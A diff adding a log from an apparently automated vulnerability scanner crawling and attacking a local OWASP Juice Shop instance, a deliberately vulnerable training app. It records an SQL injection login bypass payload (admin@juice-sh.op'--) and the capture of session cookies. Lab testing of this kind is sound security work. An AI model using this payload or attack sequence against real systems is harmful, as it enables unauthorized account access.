@@ -1,0 +1,46 @@
+15:27:47 [INFO] ============================================================
+15:27:47 [INFO] [PHASE 1] CHECKING TARGET REACHABILITY
+15:27:47 [INFO] ============================================================
+15:27:47 [INFO] 🔍 Testing connectivity to http://localhost:4040/...
+15:27:47 [INFO] ✅ Target is reachable! (Status: 200)
+15:27:47 [INFO] [+] Starting Public Discovery...
+15:27:47 [INFO] 🚀 Starting Async Crawl: http://localhost:4040/
+15:27:49 [INFO]   [..] Processing: http://localhost:4040 (Depth: 0)
+15:27:50 [INFO]     [+] Target Saved: GET http://localhost:4040/assets/i18n/en.json
+15:27:50 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/admin/application-version
+15:27:50 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/admin/application-configuration
+15:27:50 [INFO]     [+] Target Saved: GET http://localhost:4040/api/Challenges/?name=Score%20Board
+15:27:50 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/languages
+15:27:50 [INFO]     [+] Target Saved: GET http://localhost:4040/api/Quantitys/
+15:27:50 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/search?q=
+15:27:54 [INFO]     [..] Executing behavioral exploration...
+15:28:10 [INFO]     [+] Target Saved: GET http://localhost:4040
+15:28:12 [INFO] ============================================================
+15:28:12 [INFO] [PHASE 2] AUTHENTICATION / FORCED LOGIN
+15:28:12 [INFO] ============================================================
+15:28:13 [INFO] 🌐 Loading target page: http://localhost:4040/
+15:28:15 [INFO] ✅ Page loaded successfully
+15:28:15 [INFO] 🕵️ No login form on landing page, searching for entry...
+15:28:19 [INFO] ✅ Found login form at http://localhost:4040/#/login
+15:28:19 [INFO] [Auth] Attempting Primary Login Method...
+15:28:19 [INFO] [Auth] 🛡️ Attempting Aggressive Entry at http://localhost:4040/#/login
+15:28:21 [INFO] ✅ SQLi Bypass Success with payload: admin@juice-sh.op'--
+15:28:21 [INFO] 🍪 Captured 4 session cookies
+15:28:21 [INFO] ✅ [Auth Success] Current URL: http://localhost:4040/#/search
+15:28:22 [INFO] [Crawler] 🍪 External cookies set. Total: 5
+15:28:22 [INFO] ============================================================
+15:28:22 [INFO] [PHASE 3] DEEP CRAWLING WITH SESSION...
+15:28:22 [INFO] Seed URL: http://localhost:4040/#/search
+15:28:22 [INFO] ============================================================
+15:28:22 [INFO] 🚀 Starting Async Crawl: http://localhost:4040/#/search
+15:28:23 [INFO] [Crawler] 🍪 Context initialized with 5 cookies
+15:28:23 [INFO]   [..] Processing: http://localhost:4040 (Depth: 0)
+15:28:28 [INFO]     [..] Executing behavioral exploration...
+15:28:44 [INFO] ============================================================
+15:28:44 [INFO] [PHASE 4] ATTACK / EXPLOITATION
+15:28:44 [INFO] ============================================================
+15:28:44 [INFO] 📊 Deduplication: 16 -> 8 unique targets
+15:28:44 [INFO] [Requester] 🍪 5 cookies injected and session cleared.
+15:28:44 [INFO] [ScanEngine] 🔄 Global Session Sync Completed (Cookies & Auth Info)
+15:28:44 [WARNING] ⚠️ Unknown attack type: sql_injection
+15:28:44 [INFO] ✅ Found 1 vulnerabilities!
